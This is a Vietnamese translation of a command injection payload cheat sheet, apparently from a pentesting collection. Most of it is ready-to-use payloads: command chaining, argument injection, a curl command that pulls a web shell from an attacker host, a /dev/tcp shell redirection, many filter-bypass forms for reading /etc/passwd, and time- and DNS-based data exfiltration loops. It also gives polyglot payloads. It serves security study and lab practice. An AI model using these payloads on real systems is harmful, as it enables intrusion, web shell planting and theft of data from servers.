# Command Injection (Chèn lệnh)

> Command injection (chèn lệnh) là một lỗ hổng bảo mật cho phép kẻ tấn công thực thi các lệnh tùy ý bên trong một ứng dụng dễ bị tấn công.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)
    * [Các lệnh cơ bản](#basic-commands)
    * [Chuỗi lệnh](#chaining-commands)
    * [Chèn tham số (Argument Injection)](#argument-injection)
    * [Bên trong một lệnh](#inside-a-command)
* [Vượt qua bộ lọc](#filter-bypasses)
    * [Vượt qua không cần khoảng trắng](#bypass-without-space)
    * [Vượt qua bằng ký tự xuống dòng](#bypass-with-a-line-return)
    * [Vượt qua bằng backslash và xuống dòng](#bypass-with-backslash-newline)
    * [Vượt qua bằng Tilde Expansion](#bypass-with-tilde-expansion)
    * [Vượt qua bằng Brace Expansion](#bypass-with-brace-expansion)
    * [Vượt qua bộ lọc ký tự](#bypass-characters-filter)
    * [Vượt qua bộ lọc ký tự qua mã hóa Hex](#bypass-characters-filter-via-hex-encoding)
    * [Vượt qua bằng dấu nháy đơn](#bypass-with-single-quote)
    * [Vượt qua bằng dấu nháy kép](#bypass-with-double-quote)
    * [Vượt qua bằng dấu backtick](#bypass-with-backticks)
    * [Vượt qua bằng Backslash và Slash](#bypass-with-backslash-and-slash)
    * [Vượt qua bằng $@](#bypass-with-)
    * [Vượt qua bằng $()](#bypass-with--1)
    * [Vượt qua bằng Variable Expansion](#bypass-with-variable-expansion)
    * [Vượt qua bằng Wildcards](#bypass-with-wildcards)
    * [Vượt qua bằng cách viết hoa/thường ngẫu nhiên](#bypass-with-random-case)
* [Khai thác dữ liệu (Data Exfiltration)](#data-exfiltration)
    * [Khai thác dữ liệu dựa trên thời gian](#time-based-data-exfiltration)
    * [Khai thác dữ liệu dựa trên DNS](#dns-based-data-exfiltration)
* [Chèn lệnh dạng Polyglot](#polyglot-command-injection)
* [Mẹo hay](#tricks)
    * [Chạy nền các lệnh chạy lâu](#backgrounding-long-running-commands)
    * [Loại bỏ các tham số sau vị trí chèn](#remove-arguments-after-the-injection)
* [Bài lab](#labs)
    * [Thử thách](#challenge)
* [Tài liệu tham khảo](#references)

## Công cụ

* [commixproject/commix](https://github.com/commixproject/commix) - Công cụ tự động toàn diện (All-in-One) để chèn lệnh OS và khai thác
* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - Máy chủ và thư viện client thu thập tương tác OOB (out-of-band)

## Phương pháp

Command injection, còn được gọi là shell injection, là một dạng tấn công trong đó kẻ tấn công có thể thực thi các lệnh tùy ý trên hệ điều hành máy chủ thông qua một ứng dụng dễ bị tấn công. Lỗ hổng này có thể tồn tại khi một ứng dụng truyền dữ liệu không an toàn do người dùng cung cấp (form, cookie, HTTP header, v.v.) đến một system shell. Trong ngữ cảnh này, system shell là một giao diện dòng lệnh xử lý các lệnh được thực thi, thường là trên hệ thống Unix hoặc Linux.

Sự nguy hiểm của command injection là nó có thể cho phép kẻ tấn công thực thi bất kỳ lệnh nào trên hệ thống, có khả năng dẫn đến việc toàn bộ hệ thống bị xâm phạm.

**Ví dụ về Command Injection với PHP**:
Giả sử bạn có một script PHP nhận đầu vào từ người dùng để ping một địa chỉ IP hoặc domain được chỉ định:

```php
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

Trong đoạn mã trên, script PHP sử dụng hàm `system()` để thực thi lệnh `ping` với địa chỉ IP hoặc domain do người dùng cung cấp thông qua tham số GET `ip`.

Nếu kẻ tấn công cung cấp đầu vào như `8.8.8.8; cat /etc/passwd`, lệnh thực tế được thực thi sẽ là: `ping -c 4 8.8.8.8; cat /etc/passwd`.

Điều này có nghĩa là hệ thống trước tiên sẽ `ping 8.8.8.8` rồi sau đó thực thi lệnh `cat /etc/passwd`, lệnh này sẽ hiển thị nội dung của file `/etc/passwd`, có khả năng làm lộ thông tin nhạy cảm.

### Các lệnh cơ bản

Thực thi lệnh và xong :p

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```

### Chuỗi lệnh

Trong nhiều giao diện dòng lệnh, đặc biệt là các hệ thống giống Unix, có một số ký tự có thể được dùng để nối chuỗi hoặc thao tác các lệnh.

* `;` (Dấu chấm phẩy): Cho phép thực thi nhiều lệnh tuần tự.
* `&&` (AND): Chỉ thực thi lệnh thứ hai nếu lệnh đầu tiên thành công (trả về mã thoát bằng 0).
* `||` (OR): Chỉ thực thi lệnh thứ hai nếu lệnh đầu tiên thất bại (trả về mã thoát khác 0).
* `&` (Nền/Background): Thực thi lệnh ở chế độ nền, cho phép người dùng tiếp tục sử dụng shell.
* `|` (Pipe): Lấy đầu ra của lệnh đầu tiên và dùng làm đầu vào cho lệnh thứ hai.

```powershell
command1; command2   # Thực thi command1 rồi đến command2
command1 && command2 # Chỉ thực thi command2 nếu command1 thành công
command1 || command2 # Chỉ thực thi command2 nếu command1 thất bại
command1 & command2  # Thực thi command1 ở chế độ nền
command1 | command2  # Đưa đầu ra của command1 vào command2
```

### Chèn tham số (Argument Injection)

Đạt được khả năng thực thi lệnh khi bạn chỉ có thể thêm (append) tham số vào một lệnh đã có sẵn.
Sử dụng trang web này [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/) để tìm tham số cần chèn nhằm đạt được khả năng thực thi lệnh.

* Chrome

    ```ps1
    chrome '--gpu-launcher="id>/tmp/foo"'
    ```

* SSH

    ```ps1
    ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
    ```

* psql

    ```ps1
    psql -o'|id>/tmp/foo'
    ```

Argument injection có thể bị lạm dụng bằng kỹ thuật [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/).

Trong ví dụ sau, payload `＂ --use-askpass=calc ＂` sử dụng **dấu nháy kép fullwidth** (U+FF02) thay vì **dấu nháy kép thông thường** (U+0022)

```php
$url = "https://example.tld/" . $_GET['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));
```

Đôi khi, việc thực thi lệnh trực tiếp từ vị trí chèn có thể không khả thi, nhưng bạn có thể chuyển hướng luồng vào một file cụ thể, cho phép bạn triển khai một web shell.

* curl

    ```ps1
    # -o, --output <file>        Ghi ra file thay vì xuất ra stdout
    curl http://[ATTACKER.DOMAIN.TLD]/ -o webshell.php
    ```

### Bên trong một lệnh

* Chèn lệnh bằng dấu backtick.

  ```bash
  original_cmd_by_server `cat /etc/passwd`
  ```

* Chèn lệnh bằng phép thế (substitution)

  ```bash
  original_cmd_by_server $(cat /etc/passwd)
  ```

## Vượt qua bộ lọc

### Vượt qua không cần khoảng trắng

* `$IFS` là một biến shell đặc biệt gọi là Internal Field Separator (Ký tự phân tách trường nội bộ). Theo mặc định, trong nhiều shell, nó chứa các ký tự khoảng trắng (dấu cách, tab, xuống dòng). Khi được dùng trong một lệnh, shell sẽ diễn giải `$IFS` như một dấu cách. `$IFS` không hoạt động trực tiếp như một dấu phân tách trong các lệnh như `ls`, `wget`; hãy dùng `${IFS}` thay thế.

  ```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
  ```

* Trong một số shell, brace expansion (mở rộng dấu ngoặc nhọn) tạo ra các chuỗi tùy ý. Khi thực thi, shell sẽ coi các mục bên trong dấu ngoặc nhọn là các lệnh hoặc tham số riêng biệt.

  ```powershell
  {cat,/etc/passwd}
  ```

* Chuyển hướng đầu vào (Input redirection). Ký tự < báo cho shell đọc nội dung của file được chỉ định.

  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```

* Trích dẫn kiểu ANSI-C (ANSI-C Quoting)

  ```powershell
  X=$'uname\x20-a'&&$X
  ```

* Ký tự tab đôi khi có thể được dùng thay thế cho dấu cách. Trong ASCII, ký tự tab được biểu diễn bằng giá trị thập lục phân `09`.

  ```powershell
  ;ls%09-al%09/home
  ```

* Trên Windows, `%VARIABLE:~start,length%` là cú pháp được dùng để thao tác chuỗi con trên các biến môi trường.

  ```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
  ```

### Vượt qua bằng ký tự xuống dòng

Các lệnh cũng có thể được chạy tuần tự bằng ký tự xuống dòng

```bash
original_cmd_by_server
ls
```

### Vượt qua bằng backslash và xuống dòng

* Các lệnh có thể được chia thành nhiều phần bằng cách dùng backslash theo sau bởi một ký tự xuống dòng

  ```powershell
  $ cat /et\
  c/pa\
  sswd
  ```

* Dạng mã hóa URL sẽ trông như sau:

  ```powershell
  cat%20/et%5C%0Ac/pa%5C%0Asswd
  ```

### Vượt qua bằng Tilde Expansion

```powershell
echo ~+
echo ~-
```

### Vượt qua bằng Brace Expansion

```powershell
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```

### Vượt qua bộ lọc ký tự

Thực thi lệnh mà không cần backslash và slash - linux bash

```powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

### Vượt qua bộ lọc ký tự qua mã hóa Hex

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### Vượt qua bằng dấu nháy đơn

```powershell
w'h'o'am'i
wh''oami
'w'hoami
```

### Vượt qua bằng dấu nháy kép

```powershell
w"h"o"am"i
wh""oami
"wh"oami
```

### Vượt qua bằng dấu backtick

```powershell
wh``oami
```

### Vượt qua bằng Backslash và Slash

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

### Vượt qua bằng $@

`$0`: Chỉ đến tên của script nếu nó đang được chạy như một script. Nếu bạn đang ở trong một phiên shell tương tác, `$0` thường sẽ cho ra tên của shell.

```powershell
who$@ami
echo whoami|$0
```

### Vượt qua bằng $()

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

### Vượt qua bằng Variable Expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

### Vượt qua bằng Wildcards

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

### Vượt qua bằng cách viết hoa/thường ngẫu nhiên

Windows không phân biệt giữa chữ hoa và chữ thường khi diễn giải các lệnh hoặc đường dẫn file. Ví dụ, `DIR`, `dir`, hoặc `DiR` đều sẽ thực thi cùng một lệnh `dir`.

```powershell
wHoAmi
```

## Khai thác dữ liệu (Data Exfiltration)

### Khai thác dữ liệu dựa trên thời gian

Trích xuất dữ liệu từng ký tự một và phát hiện giá trị đúng dựa trên độ trễ.

* Giá trị đúng: chờ 5 giây

  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  real    0m5.007s
  user    0m0.000s
  sys 0m0.000s
  ```

* Giá trị sai: không có độ trễ

  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
  real    0m0.002s
  user    0m0.000s
  sys 0m0.000s
  ```

### Khai thác dữ liệu dựa trên DNS

Dựa trên công cụ từ [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), cũng được host tại [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)

1. Truy cập [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
2. Thực thi một lệnh 'ls' đơn giản

  ```powershell
  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
  ```

Các công cụ trực tuyến để kiểm tra việc khai thác dữ liệu dựa trên DNS:

* [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
* [app.interactsh.com](https://app.interactsh.com)
* [portswigger.net](https://portswigger.net/burp/documentation/collaborator)

## Chèn lệnh dạng Polyglot

Một polyglot là một đoạn mã hợp lệ và có thể thực thi trong nhiều ngôn ngữ lập trình hoặc môi trường khác nhau cùng một lúc. Khi nói về "chèn lệnh dạng polyglot" (polyglot command injection), chúng ta đang đề cập đến một payload chèn có thể được thực thi trong nhiều ngữ cảnh hoặc môi trường khác nhau.

* Ví dụ 1:

  ```powershell
  Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

  # Ngữ cảnh bên trong các lệnh với dấu nháy đơn và nháy kép:
  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  ```

* Ví dụ 2:

  ```powershell
  Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

  # Ngữ cảnh bên trong các lệnh với dấu nháy đơn và nháy kép:
  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
  echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
  echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
  ```

## Mẹo hay

### Chạy nền các lệnh chạy lâu

Trong một số trường hợp, bạn có thể có một lệnh chạy lâu bị hủy do tiến trình cha (đang chèn nó vào) hết thời gian chờ.
Sử dụng `nohup`, bạn có thể giữ cho tiến trình tiếp tục chạy sau khi tiến trình cha thoát.

```bash
nohup sleep 120 > /dev/null &
```

### Loại bỏ các tham số sau vị trí chèn

Trong các giao diện dòng lệnh kiểu Unix, ký hiệu `--` được dùng để báo hiệu kết thúc các tùy chọn của lệnh. Sau `--`, tất cả các tham số sẽ được coi là tên file và tham số, chứ không phải là tùy chọn.

## Bài lab

* [PortSwigger - OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
* [PortSwigger - Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
* [PortSwigger - Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
* [PortSwigger - Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
* [PortSwigger - Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
* [Root Me - PHP - Command injection](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)
* [Root Me - Command injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)
* [Root Me - PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)
* [Root Me - PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace)

### Thử thách

Thử thách dựa trên các mẹo trên, lệnh sau đây làm gì:

```powershell
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```

**LƯU Ý**: Lệnh này an toàn để chạy, nhưng bạn không nên tin tưởng tôi.

## Tài liệu tham khảo

* [Argument Injection and Getting Past Shellwords.escape - Etienne Stalmans - November 24, 2019](https://web.archive.org/web/20250306133700/https://staaldraad.github.io/post/2019-11-24-argument-injection/)
* [Argument Injection Vectors - SonarSource - February 21, 2023](https://web.archive.org/web/20251211212046/https://sonarsource.github.io/argument-injection-vectors/)
* [Back to the Future: Unix Wildcards Gone Wild - Leon Juranic - June 25, 2014](https://web.archive.org/web/20140714140437/http://www.exploit-db.com/papers/33930)
* [Bash Obfuscation by String Manipulation - Malwrologist, @DissectMalware - August 4, 2018](https://web.archive.org/web/20241202133053/https://twitter.com/DissectMalware/status/1025604382644232192)
* [Bug Bounty Survey - Windows RCE Spaceless - Bug Bounties Survey - May 4, 2017](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
* [No PHP, No Spaces, No $, No {}, Bash Only - Sven Morgenroth - August 9, 2017](https://web.archive.org/web/20220428000241/https://twitter.com/asdizzle_/status/895244943526170628)
* [OS Command Injection - PortSwigger - March 30, 2019](https://web.archive.org/web/20190330193912/https://portswigger.net/web-security/os-command-injection)
* [SECURITY CAFÉ - Exploiting Timed-Based RCE - Pobereznicenco Dan - February 28, 2017](https://web.archive.org/web/20250108174818/https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
* [TL;DR: How to Exploit/Bypass/Use PHP escapeshellarg/escapeshellcmd Functions - Kacper Szurek - April 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
* [WorstFit: Unveiling Hidden Transformers in Windows ANSI! - Orange Tsai - January 10, 2025](https://web.archive.org/web/20250109163006/https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)
